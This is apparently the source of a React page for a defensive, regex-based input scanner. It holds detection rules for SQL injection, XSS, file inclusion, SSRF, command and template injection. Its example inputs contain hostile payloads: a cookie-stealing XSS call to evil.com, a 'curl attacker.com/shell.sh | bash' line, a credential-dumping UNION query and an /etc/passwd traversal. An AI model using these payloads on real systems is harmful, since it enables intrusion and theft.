'use client';

import { useState } from 'react';
import { Search, AlertTriangle, CheckCircle, XCircle, FileText } from 'lucide-react';
import { getSeverityClass } from '@/lib/utils';

const RULES = [
  {
    id: 'sqli-1',
    name: 'SQL Injection (Classic)',
    severity: 'critical',
    pattern: /('|\")?\s*(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i,
    desc: 'Detects classic boolean-based SQL injection attempts.'
  },
  {
    id: 'sqli-2',
    name: 'SQL Injection (Union)',
    severity: 'critical',
    pattern: /UNION\s+(ALL\s+)?SELECT/i,
    desc: 'Detects UNION-based SQL injection attempts.'
  },
  {
    id: 'xss-1',
    name: 'Cross-Site Scripting (Script Tag)',
    severity: 'high',
    pattern: /<script[^>]*>[\s\S]*?<\/script>/i,
    desc: 'Detects inline JavaScript execution via script tags.'
  },
  {
    id: 'xss-2',
    name: 'Cross-Site Scripting (Event Handler)',
    severity: 'high',
    pattern: /on(load|error|click|mouseover|focus)\s*=/i,
    desc: 'Detects XSS via HTML event handlers.'
  },
  {
    id: 'lfi-1',
    name: 'Local File Inclusion',
    severity: 'high',
    pattern: /\.\.\/\.\.\/\.\.\/|(etc\/passwd|win\.ini|boot\.ini)/i,
    desc: 'Detects directory traversal or sensitive file access attempts.'
  },
  {
    id: 'ssrf-1',
    name: 'Server-Side Request Forgery',
    severity: 'high',
    pattern: /(localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.169\.254|metadata\.google)/i,
    desc: 'Detects attempts to access internal network resources or cloud metadata.'
  },
  {
    id: 'cmdi-1',
    name: 'Command Injection',
    severity: 'critical',
    pattern: /(;|\||\$\(|`)[^\n]*(curl|wget|bash|sh|nc|id|whoami)/i,
    desc: 'Detects shell command execution attempts.'
  },
  {
    id: 'ssti-1',
    name: 'Server-Side Template Injection',
    severity: 'high',
    pattern: /\{\{.*?\}\}|\$\{.*?\}|<%.*?%>/,
    desc: 'Detects template engine expression injection.'
  }
];

export default function VulnScanner() {
  const [input, setInput] = useState('');
  const [results, setResults] = useState<any[]>([]);
  const [scanned, setScanned] = useState(false);

  const scan = () => {
    setScanned(true);
    const findings = RULES.map(rule => {
      const match = input.match(rule.pattern);
      return {
        ...rule,
        found: !!match,
        matchText: match ? match[0] : null
      };
    }).filter(r => r.found);

    setResults(findings);
  };

  const loadExamples = (type: string) => {
    if (type === 'sqli') setInput("' OR '1'='1' UNION SELECT username, password FROM users--");
    if (type === 'xss') setInput('<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">');
    if (type === 'lfi') setInput('../../../etc/passwd%00');
    if (type === 'cmdi') setInput('; curl http://attacker.com/shell.sh | bash');
    setScanned(false);
    setResults([]);
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-white mb-2">Vulnerability Pattern Scanner</h1>
        <p className="text-gray-400">Analyze input strings for known malicious patterns using regex-based detection rules.</p>
      </div>

      <div className="cyber-panel p-6">
        <div className="flex flex-wrap gap-2 mb-4">
          <span className="text-sm text-gray-400 py-2">Load Example:</span>
          <button onClick={() => loadExamples('sqli')} className="px-3 py-1 bg-cyber-danger/20 text-cyber-danger text-xs rounded border border-cyber-danger/50 hover:bg-cyber-danger/30 transition-colors">SQLi</button>
          <button onClick={() => loadExamples('xss')} className="px-3 py-1 bg-cyber-warning/20 text-cyber-warning text-xs rounded border border-cyber-warning/50 hover:bg-cyber-warning/30 transition-colors">XSS</button>
          <button onClick={() => loadExamples('lfi')} className="px-3 py-1 bg-orange-500/20 text-orange-500 text-xs rounded border border-orange-500/50 hover:bg-orange-500/30 transition-colors">LFI</button>
          <button onClick={() => loadExamples('cmdi')} className="px-3 py-1 bg-cyber-danger/20 text-cyber-danger text-xs rounded border border-cyber-danger/50 hover:bg-cyber-danger/30 transition-colors">Cmd Injection</button>
        </div>

        <textarea
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="Paste suspicious input, logs, or payloads here to analyze..."
          className="cyber-input h-40 font-mono text-sm resize-none mb-4"
        />

        <button onClick={scan} className="cyber-btn w-full justify-center">
          <Search className="w-4 h-4" /> Scan Input
        </button>
      </div>

      {scanned && (
        <div className="cyber-panel p-6">
          <div className="flex items-center justify-between mb-6">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2">
              <FileText className="w-5 h-5 text-cyber-primary" /> Scan Results
            </h3>
            <div className={`px-3 py-1 rounded-full text-sm font-semibold flex items-center gap-2 ${
              results.length === 0 ? 'bg-cyber-primary/20 text-cyber-primary' : 'bg-cyber-danger/20 text-cyber-danger'
            }`}>
              {results.length === 0 ? <CheckCircle className="w-4 h-4" /> : <XCircle className="w-4 h-4" />}
              {results.length} Threat(s) Detected
            </div>
          </div>

          {results.length === 0 ? (
            <div className="text-center py-8 text-gray-500">
              <CheckCircle className="w-12 h-12 mx-auto mb-3 text-cyber-primary/50" />
              <p>No known malicious patterns detected in the input.</p>
              <p className="text-xs mt-2">Note: This is a pattern-based scanner and may not detect obfuscated or novel attacks.</p>
            </div>
          ) : (
            <div className="space-y-3">
              {results.map((r, idx) => (
                <div key={idx} className={`border-l-4 p-4 rounded-r bg-cyber-black ${getSeverityClass(r.severity).replace('text-', 'border-').split(' ')[0]} ${getSeverityClass(r.severity)}`}>
                  <div className="flex items-start justify-between">
                    <div className="flex items-start gap-3">
                      <AlertTriangle className="w-5 h-5 mt-0.5" />
                      <div>
                        <h4 className="font-semibold text-white">{r.name}</h4>
                        <p className="text-sm text-gray-400 mt-1">{r.desc}</p>
                        <div className="mt-3 bg-cyber-dark p-2 rounded border border-cyber-border">
                          <span className="text-xs text-gray-500 block mb-1">Matched Pattern:</span>
                          <code className="text-sm font-mono text-cyber-danger break-all">{r.matchText}</code>
                        </div>
                      </div>
                    </div>
                    <span className={`px-2 py-1 rounded text-xs font-bold uppercase ${getSeverityClass(r.severity)}`}>
                      {r.severity}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}